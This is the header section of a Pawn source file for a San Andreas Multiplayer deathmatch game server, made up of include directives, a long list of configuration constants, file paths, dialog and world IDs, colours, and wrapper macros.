/*
	* SAMP-IL - SA-MP.co.il (Vgames) DeathMatch #6 / United DeathMatch #2
	* й Copyright 2008-2015, Amit (`Amit_B`) Barami
	* Updated for:		SanAndreas:MultiPlayer 0.3x
	* Version:			2.0.0
	* Creation Dates:	v1:	01/05/2008
	* v2: 17/11/2008	v3:	29/06/2009
	* v4: 18/07/2009	v4 (SA-MP 0.3):	02/09/2009
	* v5: 25/12/2009	v6:	13/12/2010
	* vu1: 01/11/2011	vu2: 01/06/2012
*/
//=[Includes]===================================================================
#include "a_samp.inc"
#include "core.inc"
#include "float.inc"
#include "string.inc"
#include "file.inc"
#include "time.inc"
#include "datagram.inc"
#include "a_players.inc"
#include "a_vehicles.inc"
#include "a_objects.inc"
#include "a_sampdb.inc"
#include "a_http.inc"
//#include "antideamx.inc"
#tryinclude "pwncurl.inc"
#tryinclude "keys.inc"
#tryinclude "old_streamer.inc"
#tryinclude "y_files.inc"
#tryinclude "fixes_dm.inc"
#tryinclude "guard.inc"
#tryinclude "vmc.inc"
//=[Defines]====================================================================
// Main:
#define webpage "SA-MP.co.il"
#define comname "SAMP-IL"
#define hostname "SAMP-IL - United DeathMatch V2"
#define hostnameFirst "SAMP-IL - United DeathMatch V2"
#define version "2.0.0"
#define respawntime 180
#define spawnmoney 150
#define weekendmoney 120
#define maxping 800
#define start_sound 1076
#define debug_state false
#define lagtest false
#define hanukkah_now false // /stats - сущўф
#define han_days 9
#define aimbotcheck 0
#define purim_now false
#define srvip "212.29.229.4"
#define adv_allow "allowadv*"
#define server_version "0.3z"
#define talkprogramD 2 // 1 = ventrilo, 2 = teamspeak
#define talkprogramip "ts.sa-mp.co.il:9696"
#define updates "8"
#define MAX_CLANS 80
#define max_houses 750
#define max_houseacc 15
#define INVALID_HOUSE_ID -1
#define MAX_HOUSE_KEYS 15
#define MAX_VIEWHQS 25
#define MAX_CLAN_ALLIANCES 3
#define trainings false
#define M_S 200
#define M_S_D 2048
#define acmoney 1
#define second_auto_message_minutes 5
#define acname "DM Guard"
#define MAX_NPCS 20
#define MAX_RANKS 30
#define max_vehicles_ MAX_VEHICLES
#define MAX_PICKUPS_ 1000
#define MAX_INFOPOINTS 50
#define mute_time 120
#define ConsoleID MAX_PLAYERS
#define ConsoleName "Console"
#define max_clan_members 25
#define MAX_MONEYPICKUPS 300
#define MAX_TRIVIA 100
#define MAX_SAM 200
#define MAX_BOTMSG 50
#define MAX_TDAM 20
#define MAX_FIREWORKS 300
#define USING_NPCS 1
#define MAX_VSTORES 7
#define MAX_PINGTEST 120
#define SAVING_NICKNAMES 40
#define MAX_AREAS 250
#define MAX_FTTPOSITIONS 50
#define MAX_PARTYOBJ 120
#define MAX_TEAMS 100
#define DEFAULT_UPOWER_KEYS (KEY_SPRINT + KEY_WALK)
#define DEFAULT_UPOWER2_KEYS (KEY_WALK + KEY_SUBMISSION)
#define DEFAULT_UPOWER3_KEYS (KEY_SPRINT + KEY_JUMP + KEY_WALK)
#define worlddef_weather 4
#define worlddef_time 8
#define MAX_UPOWERS 9
#define MAX_ADMIN_VEHICLES 20
#define MAX_ADMIN_TELEPORTS 10
#define max_bb 6
#define MAX_OBJECTED_VEHICLES 10
#define MAX_ATTACHED_OBJECTED 10
#define audio_url "http:/" "/sa-mp.co.il/samp/sounds/"
#define MAX_ORGS 40
#define MAX_ACTIVITY_PLAYERS 100
#define MAX_MODE_HELP 120
#define MAX_PLACES 40
#define MAX_NEWS 1000
#define MAX_NEWS_LENGTH 1000
#define min_tele_health 0.0
#define KILL_TESTS 18
#define MAX_GPROPERTIES 3600
#define MAX_FRIENDS 9
#define MAX_SHOWS 10
#define MAX_SHOW_NPCS 10
#define INFINITY Float:0x7F800000
#define MAX_STREAMED_VEHICLES 100
#define MAX_INVITES 3
#define PLAYER_ALPHA 55
#define MAX_SECURITY_WORD_LENGTH 32
#define BOT_SERIAL "DA0E5085558CCACC88ECCA40C4CEC49A9408EEE8"
#define PAY_TIME 5
#define MAX_TUTORIALS 10
#define MAX_TUTORIALS_PARTS 300
#define MAX_TUTORIAL_PART_LINES 6
#define MAX_WMSG 100
#define MAX_SAVED_DATA 10
#define MAX_DIARY_LINES 10
#define MAX_CHAT_LINES 25
#define MAX_CHAT_USERS 10
#define MAX_CLAN_CAMERAS 3
#define MAX_SPAM_IPS 150
#define SPECIAL_ACTION_PISSING 68
#define MAX_CBANK_LOGS 8
// Models:
#define MAX_MODELS 150
#define MAX_MODEL_ITEMS 500
#define SELECTION_ITEMS 21
#define ITEMS_PER_LINE 7
#define MAX_DMZ_PLAYERS 50
// Castles:
#define MAX_CASTLES 3
#define MAX_CASTLE_NAME 35
#define MAX_CASTLE_CAPTURE_PLAYERS 5
#define MAX_CASTLE_CAPTURE_TIME (2*60)+30
#define MAX_CASTLE_TIME_NEW 1800
#define INVALID_CASTLE_ID -1
// Missions:
#define INVALID_MISSION_ID -1
#define MAX_MISSIONS 5
#define MAX_MISSION_TARGETS 10
// ReDefines:
#undef INVALID_MENU
#undef INVALID_TEXT_DRAW
#define INVALID_MENU (Menu:0xFF)
#define INVALID_TEXT_DRAW Text:0xFFFF
#define INVALID_PLAYER_TEXT_DRAW PlayerText:0xFFFF
// Objects:
#define max_objects 8000
#define object_show_distance 350.0
#define object_stream_distance 250.0
// Properties:
#define max_properties 80
#define prop_earns 30
#define max_player_props 12
// Music:
#define MAX_MUSICS 80
#define MAX_MUSIC_TYPES 8
#define MAX_MUSIC_NAME 100
#define music_url "http:/" "/gamesounds.atwebpages.com"
// Folders:
#define folder_dm "/DM/"
#define folder_clans "/DM/Clans/"
#define folder_users "/DM/Users/"
#define folder_bans "/DM/Bans/"
#define folder_houses "/DM/Houses/"
#define folder_props "/DM/Properties/"
#define folder_logs "/DM/Logs/"
#define folder_ip "/DM/Bans/IP/"
#define folder_banuid "/DM/Bans/UID/"
#define folder_info "/DM/Info/"
#define folder_infol "/DM/Info/Last/"
#define folder_infonl "/DM/Info/NickLogs/"
#define folder_infoco "/DM/Info/ClaimOutput/"
#define folder_backups "/DM/Backups/"
#define folder_ipdata "/DM/IPData/"
#define folder_vstores "/DM/VehicleStores/"
#define folder_hs "/DM/HighScores/"
#define folder_orgs "/DM/Organizations/"
#define folder_help "/DM/ModeHelp/"
#define folder_news "/DM/News/"
#define folder_shows "/DM/Shows/"
#define folder_races "/DM/Races/"
#define folder_tutorials "/DM/Tutorials/"
#define folder_hq "/DM/HQs/"
#define folder_rewards "/DM/Rewards/"
// Files:
#define file_rules "/DM/Rules.txt"
#define file_am "/DM/AutoMessage.txt"
#define file_am2 "/DM/AutoMessage2.txt"
#define file_am3 "/DM/AutoMessage3.txt"
#define file_adm "/DM/AdminsMessage.txt"
#define file_bb "/DM/BulletinBoard.ini"
#define file_words "/DM/Censoring.txt"
#define file_cps "/DM/Checkpoints.txt"
#define file_houses "/DM/Houses.txt"
#define file_props "/DM/Properties.txt"
#define file_nbans "/DM/NBans.ini"
#define file_clans "/DM/Clans/Clans.ini"
#define file_admins "/DM/Admins.ini"
#define file_bugs "/DM/Bugs.txt"
#define file_advices "/DM/Advices.txt"
#define file_preports "/DM/PlayerReports.txt"
#define file_areports "/DM/AdminReports.txt"
#define file_creports "/DM/ClanReports.txt"
#define file_codes "/DM/Codes.ini"
#define file_vip "/DM/VIPs.ini"
#define file_ranks "/DM/Ranks.ini"
#define file_srvdetails "/DM/ServerDetails.ini"
#define file_int "/DM/Interiors.txt"
#define file_sam "/DM/SecondAutoMessage.ini"
#define file_tdam "/DM/TDAutoMessage.ini"
#define file_pickups "/DM/Pickups.ini"
#define file_hskills "/DM/HighScores/Kills.ini"
#define file_hsruling "/DM/HighScores/ClanRuling.ini"
#define file_trivia "/DM/Trivia.ini"
#define file_botmsg "/DM/BotMessages.ini"
#define file_ftt "/DM/FindTheTreasure.ini"
#define file_racerecords "/DM/HighScores/RaceRecords.ini"
#define file_orgs "/DM/Organizations/Organizations.ini"
#define file_places "/DM/Places.ini"
#define file_news "/DM/News/News.ini"
#define file_bot "/DM/BotDefaults.ini"
#define file_purim "/DM/Purim.txt"
#define file_music "/DM/Music.ini"
#define file_statistics "/DM/Statistics.ini"
#define file_srvmessage "/DM/ServerMessage.txt"
#define file_signboards "/DM/Signboards.ini"
#define file_besttoday "/DM/BestToday.ini"
#define file_wmsg "/DM/WelcomeMessages.ini"
#define file_trating "/DM/TeleportRating.ini"
// Colors:
#define yellow 0xFAFA6EFF
#define lightyellow 0xFFFFB0FF
#define darkyellow 0xDEDE14FF
#define green 0x11F24AFF
#define lightgreen 0x62F09DFF
#define darkgreen 0x36A33BFF
#define red 0xFF2626FF
#define lightred 0xFF0000FF
#define darkred 0x9C0606FF
#define white 0xFFFFFFFF
#define pink 0xF23A9CFF
#define lightpink 0xED93C3FF
#define blue 0x3030DBFF
#define lightblue 0x059BE6FF
#define darkblue 0x181894FF
#define grey 0xC0C0C0FF
#define orange 0xEDA96BFF
#define black 0x000000FF
#define purple 0x7E17E6FF
#define lightpurple 0xCF50FAFF
#define brown 0xAD7258FF
#define vipcol 0xc0fec0ff
#define C_yellow FAFA6E
#define C_lightyellow FFFFB0
#define C_darkyellow DEDE14
#define C_green 11F24A
#define C_lightgreen 62F09D
#define C_darkgreen 36A33B
#define C_red D62B2B
#define C_lightred FF0000
#define C_darkred 9C0606
#define C_white FFFFFF
#define C_pink F23A9C
#define C_lightpink FF99CC
#define C_blue 5757FF
#define C_lightblue 059BE6
#define C_darkblue 181894
#define C_grey C0C0C0
#define C_orange EDA96B
#define C_black 000000
#define C_purple 7E17E6
#define C_lightpurple CF50FA
#define C_brown AD7258
#define @c(%1) "{"#C_%1"}"
#define @h(%1) "{"#%1"}"
// Checkpoints:
#define max_checkpoints 500
#define cp_none 0
#define cp_bank 1
#define cp_ammu 2
#define cp_wang 3
#define cp_sammu 4
//#define cp_cbank 5
#define cp_vgarage 6
#define cp_bar 7
#define cp_vstore 8
#define cp_phone 9
#define cp_atm 10
#define cp_lighthouse 11
#define cp_abank 12
#define cp_gambling 13
#define cp_store 14
#define cp_info 15
#define cp_vstation 16
#define cp_dancing 17
#define cp_jumping 18
#define cp_castle 19
#define cp_furnitures 20
#define cp_sgarage 21
#define default_cpsize 2.500000
#define default_cpdistance 60.000000
// Virtual Worlds:
#define world_normal 0
#define world_mode 1
#define world_ghosts 2
#define world_war 3
#define world_race 4
#define world_wwe 5
#define world_kart 6
#define world_monster 7
#define world_srace 8
#define world_kickstar 9
#define world_ewar 10
#define world_wstunts 22
#define world_shooting 23
#define world_purim 24
#define world_stunting 25
#define world_fun 26
#define world_manhunt 27
#define world_sport 28
#define world_crash 29
#define world_army 30
#define world_challenges 31
#define world_stunts 32
#define world_waterace 33
#define world_zombies 34
#define world_glass 35
#define world_reqclass 36
#define world_bank 37
#define world_special 38
#define world_parachuting 39
#define world_show 40
#define world_pirateship 41
#define world_briefcase 42
#define world_count 43
#define worlds_dmz 100
#define worlds_teamact 120
#define worlds_tdm 140
#define world_missions 160
#define max_worlds 500
// Works:
#define work_none 0
#define work_cop 1
#define work_doctor 2
#define work_taxi 3
#define work_bus 4
#define work_train 5
#define work_pilot 6
#define work_weapons 7
#define work_killer 8
#define work_icecream 9
#define work_drugs 10
// DM Zones:
#define max_dmzs 14
#define dmz_none 0
#define dmz_war 1
#define dmz_heavy 2
#define dmz_gungame 3
#define dmz_matrix 4
#define dmz_mm 5
#define dmz_grenmol 6
#define dmz_fire 7
#define dmz_jetp 8
#define dmz_rcwar 9
#define dmz_shavuot 10
#define dmz_pirates 11
#define dmz_boats 12
#define dmz_cbug 13
// TDM Zones:
#define max_tdms 2
#define tdmz_none 0
#define tdmz_heavy 1
// Pets:
#define pet_none 0
#define pet_fish 1
#define pet_jelly 2
#define pet_rjelly 3
#define pet_turtle 4
#define pet_dolphin 5
#define pet_shark 6
// Races:
#define race1_cars 0
#define race2_bikes 1
#define race3_planes 2
#define race4_boats 3
#define race5_crazy 4
#define race6_tires 5
#define race7_invcars 6
#define race8_waterdrive 7
// Icons:
#define icon_player 0
#define icon_bank 1
#define icon_wang 2
#define icon_wang2 3
#define icon_race 4
#define icon_lvap 5
#define icon_sfap 6
#define icon_lsap 7
#define icon_ships 8
#define icon_docks 9
#define icon_quarry 10
#define icon_pirate 11
#define icon_lighthouse 12
#define icon_place 13
#define icon_mission 14
#define icon_sgarage 15
#define icons_count 16
#define icons_properties 16
// Dialogs:
#define dialog_login 0
#define dialog_register 1
#define dialog_wrongpass 2
#define dialog_badregister 3
#define dialog_ni 4
#define dialog_changepass 5
#define dialog_changename 6
#define dialog_wrongchangepass 7
#define dialog_wrongchangename 8
#define dialog_tm 9
#define dialog_wrongtp 10
#define dialog_level 11
#define dialog_bank 12
#define dialog_banksetting 13
#define dialog_bankpass 14
#define dialog_deposit 15
#define dialog_withdraw 16
#define dialog_ammu 18
#define dialog_bw 19
#define dialog_bwwrong 20
#define dialog_clickplayer 21
#define dialog_pm 22
#define dialog_report 23
#define dialog_pay 24
#define dialog_transfer 25
#define dialog_baccw1 26
#define dialog_baccw2 27
#define dialog_baccw3 29
#define dialog_baccb 30
#define dialog_upowers 31
#define dialog_upowerinfo 32
#define dialog_vlist 33
#define dialog_vlist2 34
#define dialog_vlist3 35
#define dialog_badcmessage 37
#define dialog_cupowers 38 // deprecated
#define dialog_cupowerinfo 39 // deprecated
#define dialog_purim 40
#define dialog_stunting 41
#define dialog_stuntstele 42
#define dialog_challenges 43
#define dialog_dm 45
#define dialog_phone 46
#define dialog_phone2 47
#define dialog_spammu 48
#define dialog_achievements 49 // deprecated
#define dialog_achievement 50 // deprecated
#define dialog_atm 51
#define dialog_clogs 52
#define dialog_clogs2 53
#define dialog_stele 54
#define dialog_shootingrange 55
#define dialog_lighthouse 56
#define dialog_lighthouse2 57
#define dialog_setting 58
#define dialog_setting2 59
#define dialog_settinghelp 60
#define dialog_clancamera 61 // deprecated
#define dialog_clanperms 62 // deprecated
#define dialog_clanperms2 63 // deprecated
#define dialog_wtype 64
#define dialog_wtype2 65
#define dialog_youtube 66
#define dialog_youtube2 67
#define dialog_duel 68
#define dialog_duel2 69
#define dialog_help 70
#define dialog_help2 71
#define dialog_lcmds 72
#define dialog_lcmds2 73
#define dialog_lcmdsinfo 74
#define dialog_lcmdsupgrade 75
#define dialog_property 76
#define dialog_pets 77
#define dialog_petserr 78
#define dialog_airstrike 79
#define dialog_airstrike2 80
#define dialog_airstrikeerr 81
#define dialog_remfriends 82 // deprecated
#define dialog_profile 83
#define dialog_editprofile 84
#define dialog_editprofile2 85
#define dialog_editprofile3 86
#define dialog_mode 87
#define dialog_modehelpmenu 88
#define dialog_code 89
#define dialog_code2 90
#define dialog_codeaccept 91
#define dialog_codeerror 92
#define dialog_tagchange 93
#define dialog_levelnamechange 94
#define dialog_places 95
#define dialog_places2 96
#define dialog_placeinfo 97
#define dialog_levels 98
#define dialog_levels2 99
#define dialog_question 100
#define dialog_answer 101
#define dialog_admintotal 102
#define dialog_admintotal2 103
#define dialog_teamact 104
#define dialog_games 105
#define dialog_games2 106
#define dialog_games3 107
#define dialog_gameserr 108
#define dialog_news 109
#define dialog_scroll 110
#define dialog_scroll2 111
#define dialog_dmworld 112
#define dialog_zombies 113
#define dialog_finishduel 114
#define dialog_ccard 115
#define dialog_addons 116
#define dialog_ammusale 117
#define dialog_settime 118
#define dialog_setwea 119
#define dialog_buyphone 120
#define dialog_buyphoneerr 121
#define dialog_purim2 122
#define dialog_enter 123
#define dialog_setpwea 124
#define dialog_music 125
#define dialog_music2 126
#define dialog_parachuting 127
#define dialog_shavuot 128
#define dialog_clothesmenu 129
#define dialog_clothes 130
#define dialog_clothes2 131
#define dialog_clothesmsg 132
#define dialog_getsetting 133
#define dialog_getsetting2 134
#define dialog_kick 135
#define dialog_ban 136
#define dialog_showlist 137
#define dialog_showinfo 138
#define dialog_show 139
#define dialog_addonserr 140
#define dialog_ammusaleerr 141
#define dialog_border_me 142
#define dialog_border_me2 143
#define dialog_border_bank 144
#define dialog_border_friends 145
#define dialog_border_pmfriend 146
#define dialog_border_setting 147
#define dialog_border_color 148
#define dialog_border_alpha 149
#define dialog_border_settingmsg 150
#define dialog_sail 151
#define dialog_spw 152
#define dialog_spwbuy 153
#define dialog_spwerr 154
#define dialog_addonbuy 155
#define dialog_showstats 156
#define dialog_secretword 157
#define dialog_takereport 158
#define dialog_clan 159
#define dialog_clanclose 160
#define dialog_claninvite 161
#define dialog_clanleave 301
#define dialog_objectives 162
#define dialog_objective 163
#define dialog_diary 164
#define dialog_diaryinput 165
#define dialog_friends 166
#define dialog_friendsadd 167
#define dialog_friendsadde 168
#define dialog_friendsmsg 211
#define dialog_friendsopt 169
#define dialog_friendsopte 170
#define dialog_friendsremove 171
#define dialog_friendsask 172
#define dialog_fountain 173
#define dialog_tutorials 174
#define dialog_tutorial 175
#define dialog_chat 176
#define dialog_chatm 177
#define dialog_chatm2 178
#define dialog_chatme 179
#define dialog_chatinvite 180
#define dialog_rate 181
#define dialog_admintoggle 182
#define dialog_tdm 183
#define dialog_tdm2 184
#define dialog_gamblingmoney 185
#define dialog_gamblingmachine 186
#define dialog_cabonus 187
#define dialog_cabonuspaybank 188
#define dialog_lottoquestion 189
#define dialog_lottoquestion2 190
#define dialog_silence 191
#define dialog_silence2 192
#define dialog_rpassword 193
#define dialog_cmdmelee 194
#define dialog_cmdgun 195
#define dialog_tlist 196
#define dialog_tcategory 197
#define dialog_admins 198
#define dialog_missions 199
#define dialog_buygarage 200
#define dialog_garageitems 201
#define dialog_keys 203
#define dialog_getkey 204
#define dialog_givekey 205
#define dialog_furnitures 206
#define dialog_subfurnitures 207
#define dialog_fitems 208
#define dialog_amusic 209
#define dialog_hanukkah 210
#define dialog_hanukkah2 211
#define dialog_house 212
#define dialog_housemenu 213
#define dialog_housemenu2 214
#define dialog_gamble 215
#define dialog_cbank 216
#define dialog_cbank_deposit 217
#define dialog_cbank_withdraw 218
#define dialog_rewards 219
#define dialog_rewards2 220
#define dialog_rewards_com 221
// Moving Text:
#define MAX_MOVING_TEXTS 5
#define MAX_MOVINGTEXT_LENGTH M_S * 2
#define mt_activity 0
#define mt_admin 1
// Special Vehicles:
#define SV_SUBMARINE 1
#define SV_DOLPHIN1 2
#define SV_DOLPHIN2 3
#define SV_BALL 4
#define SV_GHOSTSHIP 5
#define SV_TRANSHELI 6
#define SV_PIRATE 7
// Attach Object Slot:
#define aoslot_helmet 1
#define aoslot_spw 1
#define aoslot_godeyeright 1
#define aoslot_underwater 1
#define aoslot_cellphone 2
#define aoslot_godeyeleft 2
#define aoslot_elevator 3
#define aoslot_godskin1 3
#define aoslot_purim 3
#define aoslot_godskin2 4
#define aoslot_godskin3 5
#define aoslot_shavuot 2
#define aoslot_shavuot2 3
#define aoslot_shavuot3 4
#define aoslot_clothes 4
#define aoslot_clothes2 5
#define aoslot_laser 3
#define aoslot_test 6
// Teleport Types:
#define tele_none -1
#define tele_normal 0
#define tele_stunts 1
#define tele_challenge 2
#define tele_parachuting 3
#define tele_war 4
#define tele_private 5
// Area Types:
#define area_tele 0
#define area_nstele 1
#define area_hq 2
#define area_cp 3
#define area_object 4
#define area_castle 5
#define area_viewhq 6
#define area_money 7
// Object Areas:
#define oarea_fountain 1
// Activity Prizes:
#define actprize_race1 6000
#define actprize_race2 4000
#define actprize_race3 2000
#define actprize_swar 3500
#define actprize_wwe 1000
#define actprize_kart 5000
#define actprize_monster 5000
#define actprize_kickstar 6000
#define actprize_srace1 5000
#define actprize_srace2 3000
#define actprize_srace3 1500
#define actprize_ewar 3500
#define actprize_wargames 2500
#define actprize_manhunt 6000
#define actprize_sport 4000
#define actprize_army 2000
#define actprize_teamact 5000
#define actprize_zombies 3500
#define actprize_glass 5000
#define join_act 25
// Special Activities:
#define sa_none -1
#define sa_ftt 0
#define sa_party 1
#define sa_ammusale 2
#define sa_dlotto 3
#define sa_sail 4
#define sa_sequence 5
#define sa_count 6
#define sa_timestart 14
#define sa_timeend 20
// Special Weapons:
#define spw_none 0
#define spw_ggrenade 1
#define spw_smoke 2
#define spw_hammer 3
#define spw_psniper 4
#define spw_doublem4 5
#define spw_grandrpg 6
#define spw_taser 7
// Player Options:
#define po_cantlook 1
#define po_pee 2
// Body Parts:
#define bodypart_unknown 0
#define bodypart_head 1
// Sport Activity Types:
#define sport1_football 1
#define sport2_basketball 2
// Power Params:
#define powerparam_none 0
#define powerparam_firezone 1
#define powerparam_firestream 2
#define powerparam_fountain 3
#define powerparam_waterfall 4
#define powerparam_return 5
#define powerparam_lcharge 6
#define powerparam_lrelease 7
#define powerparam_energy 8
#define powerparam_devilcurse 9
// Temp Text Draws:
#define max_temptexts 5
#define temptext_none 0
#define temptext_upower 1
#define temptext_hp 2
#define temptext_jump 3
#define temptext_admin 4
// Ammunation Sales:
#define ammusale_none 0
#define ammusale_freeone 1
#define ammusale_half 2
// Teams:
#define teams_start_from MAX_CLANS
#define team_manhunt teams_start_from+1
#define team_activity teams_start_from+1
// Player Settings:
#define max_settings 20
#define setting_colchat 0
#define setting_autologin 1
#define setting_showjoin 2
#define setting_showquit 3
#define setting_showafk 4
#define setting_showpunish 5
#define setting_classselection 6
#define setting_fs 7
#define setting_automessage 8
#define setting_clock 9
#define setting_speedo 10
#define setting_hs 11
#define setting_sounds 12
#define setting_hp 13
#define setting_stats 14
#define setting_showslaps 15
#define setting_sniper 16
#define setting_telecam 17
#define setting_showwanted 18
#define setting_hitsound 19
// Clan Actions:
#define clan_none 0
#define clan_main 1
#define clan_not 2
#define clan_err 3
#define clan_fullinfo 4
#define clan_allmembers 5
#define clan_onlinemembers 6
#define clan_edit 7
#define clan_manage 8
#define clan_systems 9
#define clan_chat 10
#define clan_powers 11
#define clan_cameras 12
#define clan_store 13
#define clan_alliances 14
#define clan_other 15
#define clan_quit 16
#define clan_tutorial 17
#define clan_addmember 18
#define clan_viewmember 19
#define clan_optmember 20
#define clan_settag 21
#define clan_setlevel 22
#define clan_kick 23
#define clan_selectpos 24
#define clan_editcmd 25
#define clan_editgangzone 26
#define clan_editcolor 27
#define clan_message 28
#define clan_messageedit 29
#define clan_rules 30
#define clan_rulesedit 31
#define clan_rulesreset 32
#define clan_ruleinput 33
#define clan_signs 34
#define clan_signinput 35
#define clan_perms 36
#define clan_permsview 37
#define clan_permsedit 38
#define clan_permselect 39
#define clan_permsdefaults 40
#define clan_buysystems 41
#define clan_buysystem 42
#define clan_vcontrol 43
#define clan_vcolor 44
#define clan_savevcolors 45
#define clan_hqcontrol 46
#define clan_effects 47
#define clan_settingspeed 48
#define clan_setspeed 49
#define clan_usematerial 50
#define clan_chatcolor 51
#define clan_chatlcolor 52
#define clan_buypower 53
#define clan_usepower 54
#define clan_cameraselect 55
#define clan_cameraremove 56
#define clan_cameraupgrade 57
#define clan_cw 58
#define clan_cwinvite 59
#define clan_alliances_invite 60
#define clan_alliances_remove 61
#define clan_permsview_total 62
#define clan_bankhistory 63
// Clan Permissions:
#define max_clanperms 23
#define clanperm_invite 0
#define clanperm_kick 1
#define clanperm_kickn 2
#define clanperm_edit 3
#define clanperm_coloredit 4
#define clanperm_bank 5
#define clanperm_peace 6
#define clanperm_war 7
#define clanperm_settag 8
#define clanperm_message 9
#define clanperm_rules 10
#define clanperm_chat 11
#define clanperm_upgrade 12
#define clanperm_signs 13
#define clanperm_power 14
#define clanperm_gzone 15
#define clanperm_vcontrol 16
#define clanperm_hqcontrol 17
#define clanperm_camera 18
#define clanperm_hq 19
#define clanperm_deposit 20
#define clanperm_withdraw 21
#define clanperm_carea 22
// Clan Systems:
#define max_clansystems 7
#define clansys_tk 0
#define clansys_alert 1
#define clansys_lockveh 2
#define clansys_lockpick 3
#define clansys_controlv 4
#define clansys_controlhq 5
#define clansys_security 6
// Weapon Types:
#define max_wtypes 6
#define wtype_pistol 0
#define wtype_microsmg 1
#define wtype_assault 2
#define wtype_sniper 3
#define wtype_throw 4
#define wtype_rpg 5
// TXDs:
#define max_txd 2
#define txd_map 0
// Player Status:
#define status_none 0
#define status_fighting 1
#define status_afk 2
#define status_act 3
#define status_class 4
#define status_dmz 5
#define status_battle 6
#define status_drift 7
#define status_prace 8
#define status_crane 9
#define status_spec 10
#define status_cwar 11
#define status_sr 12
#define status_test 13
#define status_driving 14
// Per Player Texts:
#define MAX_PPT 10
#define ppt_none 0
#define ppt_bank 1
#define ppt_count 2
// Stores:
#define store_none 0
#define store_clothes 1
#define store_pets 2
#define store_bombs 3
#define store_phones 4
// Scrolls:
#define scroll_none -1
#define scroll_doublekill 0
#define scroll_doubledamage 1
#define scroll_autohealing 2
// TFO Status:
#define tfo_none 0
#define tfo_class 1
#define tfo_fade 2
// Vehicle Pickups:
#define vp_repair 0
#define vp_nitro 1
#define vp_replace 2
#define vp_turbo 3
// Fade Params:
#define fade_none 0
// Edit Object Status:
#define edit_null 0
#define edit_attached_clothes 1
#define edit_attached_test 2
// Special Ammunation Items:
#define ai_laser 0
#define ai_armour 1
#define ai_jetpack 2
#define ai_bugarmour 3
#define ai_infinitecmd 4
#define max_ammunation_items 5
// Camera Interpolate Paths:
#define ipath_none 0
#define ipath_spawn 1
#define ipath_teleport 2
// Stats Fields:
#define statsfield_stats 0
#define statsfield_profile 1
#define statsfield_groups 2
#define statsfield_weapons 3
#define statsfield_properties 4
#define statsfield_vehicles 5
#define statsfield_objectives 6
#define statsfield_activities 7
// Admin Notifications:
#define adminot_newtopic 1
#define adminot_newreport 2
#define adminot_msg 3
#define adminot_minority 4
#define adminot_adv 5
#define adminot_cheating 6
// Objectives:
#define MAX_OBJECTIVES 10
#define objective_playingtime1 0
#define objective_playingtime2 1
#define objective_million 2
#define objective_killedmill 3
#define objective_knife 4
#define objective_properties 5
#define objective_stunter 6
#define objective_shooter 7
#define objective_shootrange 8
#define objective_sawnpro 9
// Admin Toggles:
#define max_atoggles 8
#define atoggle_cmd 0
#define atoggle_pm 1
#define atoggle_phone 2
#define atoggle_gang 3
#define atoggle_clan 4
#define atoggle_team 5
#define atoggle_org 6
#define atoggle_vip 7
// Gambling Types:
#define gambling_money 0
#define gambling_machine 1
// Signboard Update Types:
#define sbu_auto 0
#define sbu_clans 1
// Silence:
#define max_silence_types 3
#define sil_dmguard 0
#define sil_chat 1
#define sil_clan 2
// Admin Total Abilities:
#define at_none 0
#define at_range 1
#define at_total 2
#define at_player 3
#define at_act 4
// Fly Mode Types:
#define fmt_none 0
#define fmt_admin 1
#define fmt_clan 2
// Activity IDs:
#define aid_races 0
#define aid_sraces 1
#define aid_swar 2
#define aid_wwe 3
#define aid_ewar 4
#define aid_zwar 5
#define aid_glass 6
#define aid_bc 7
#define aid_kart 8
#define aid_monster 9
#define aid_kickstar 10
#define aid_army 11
#define aid_wargames 12
#define aid_manhunt 13
#define aid_sport 14
#define aid_teams 15
#define aid_chat 16
#define aid_ftt 17
// NPC Params:
#define np_none 0
#define np_rob 1
#define np_reqclass 2
// Directive Functions:
#define fileCheck(%1) if(!fexist(%1)) fcreate(%1)
#define folderCheck(%1) if(!fexist(%1)) dcreate(%1)
#define fixchars(%1) for(new fix = 0, len = strlen(%1); fix < len; fix++) if(%1[fix] < 0) %1[fix] += 256
#define GetVehicleName(%1) VehicleNames[%1-400]
stock strval_fix(string[]) return strlen(string) > 49 ? 0 : strval(string);
#define strval strval_fix
#define dbg(%1,%2) if(debugstate) print("DEBUG " #%1 " " %2), Log("Debug",ConsoleID,"DEBUG " #%1 " " %2)
#define ShowPlayerDialog ShowPlayerDialog2
#define fwrite fwrite_utf8
#define SetPlayerSkillLevel SetPlayerSkillLevel2
#define LinkVehicleToInterior LinkVehicleToInterior2
#define SetPlayerPos SetPlayerPos2
#define SetVehiclePos SetVehiclePos2
#define SetPlayerVelocity SetPlayerVelocity2
#define SetVehicleVelocity SetVehicleVelocity2
#define SetVehicleHealth SetVehicleHealth2
#define RepairVehicle RepairVehicle2
#define SendClientMessage SendClientMessage2
#define SendClientMessageToAll SendClientMessageToAll2
#define TogglePlayerSpectating TogglePlayerSpectating2
#define PutPlayerInVehicle PutPlayerInVehicle2
#define RemovePlayerFromVehicle RemovePlayerFromVehicle2
#define SetPlayerInterior SetPlayerInterior2
#define SendDeathMessage SendDeathMessage2
#define GetPlayerState GetPlayerState2
#define gettime gettime2
#define SetPlayerName SetPlayerName2
#define GetPlayerWeapon GetPlayerWeapon2
#define PlayAudioStreamForPlayer PlayAudioStreamForPlayer2
#define IsCar(%1) (GetVehicleType(%1) == 0)
#define IsBike(%1) (GetVehicleType(%1) == 1)
#define IsBoat(%1) (GetVehicleType(%1) == 2)
#define IsHeli(%1) (GetVehicleType(%1) == 3)
#define IsPlane(%1) (GetVehicleType(%1) == 4)
#define CrashProtection_CheckFile(%1,%2) if(!fexist(%1)) do { new stR[128]; format(stR,sizeof(stR),"Crash Protection: File not found: %s (" #%1 ")",filename); AdminInfo(ConsoleID,stR); return %2; } while FALSE
#define DialogCreate(%1) do { new dialogText[%1*256]
#define DialogString(%1) format(dialogText,sizeof dialogText,"%s%s" %1,dialogText,!strlen(dialogText) ? ("") : ("\n"))
#define DialogFormat(%1) format(dialogText,sizeof dialogText,"%s%s%s",dialogText,!strlen(dialogText) ? ("") : ("\n"),%1)
#define DialogSend(%1,%2,%3,%4,%5,%6) ShowPlayerDialog(%1,%2,%3,%4,dialogText,%5,%6); } while FALSE
#define isAcceptedDBWeapon(%1) ((%1 >= 22 && %1 <= 34) || %1 == 38)
#define ConvertVelocityToKMH(%1,%2,%3) floatround(floatround(floatpower((%1*%1)+(%2*%2)+(%3*%3),0.5)*100)*2.0)
#define IsPlayerConnected IsPlayerConnected2
#define SetTimer Timer_Set
#define KillTimer Timer_Kill
